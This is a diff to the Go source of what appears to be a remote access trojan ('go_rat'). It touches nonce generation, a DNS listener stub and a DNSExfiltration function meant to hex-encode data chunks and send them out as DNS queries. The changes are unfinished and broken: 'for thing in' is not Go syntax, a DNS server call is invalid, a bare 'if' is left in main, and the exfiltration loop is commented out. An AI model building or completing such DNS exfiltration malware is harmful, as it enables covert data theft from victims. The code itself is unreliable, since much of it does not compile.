@@ -52,14 +52,15 @@ import (
 	"compress/zlib"
 	"crypto/rand"
 	"crypto/sha256"
-	"encoding/hex"
 	"flag"
 	"fmt"
 	"go_rat/pkg/shared_code/ErrorHandling"
 	"io"
+	"math/big"
 	"net"
 	"os"
 
+	"github.com/miekg/dns"
 	"golang.org/x/crypto/chacha20poly1305"
 )
 
@@ -94,12 +95,13 @@ func OpenFile() {
 
 }
 
-// This function creates a nonce
+// This function creates a nonce with the bit size set
+// by setting the chacha20poly1305.NonceSizeX variable
 func NonceGenerator() (nonce []byte, derp error) {
 	//var n *big.Int
-	//bitsize := big.NewInt(24)
+	bitsize := big.NewInt(24)
 	//nonce = make([]byte, 24)
-	nonce := make([]byte, chacha20poly1305.NonceSizeX)
+	nonce = make([]byte, chacha20poly1305.NonceSizeX)
 	// make random 24 bit prime number
 	n, derp := rand.Int(rand.Reader, bitsize)
 	if derp != nil {
@@ -205,7 +207,7 @@ func sendDNSmessage(MsgAsHexStr string, DestZone string) {
 
 }
 func DnsReceiver() {
-
+	dns.Server.Listener()
 }
 
 // Exports a sequence of bytes via DNS packets
@@ -218,12 +220,12 @@ func DNSExfiltration(ByteArrayInput []byte, DestZone string, MaxMsgSize int) (he
 	// the dns zone to send the queries to.
 	DestZone = ""
 	MaxMsgSize = 512 // bytes
-	chunksofdata := DataChunkerChunkSize(ByteArrayInput, MaxMsgSize)
+	//chunksofdata := DataChunkerChunkSize(ByteArrayInput, MaxMsgSize)
 
-	for thing in chunksofdata {
-		hexString := hex.EncodeToString(dataBytes)
-		sendDNSmessage(hexString, DestZone)
-	}
+	//for thing in chunksofdata {
+	//	hexString := hex.EncodeToString(dataBytes)
+	//	sendDNSmessage(hexString, DestZone)
+	//}
 
 }
 
@@ -240,4 +242,5 @@ func main() {
 		flag.PrintDefaults()
 		return
 	}
+	if
 }
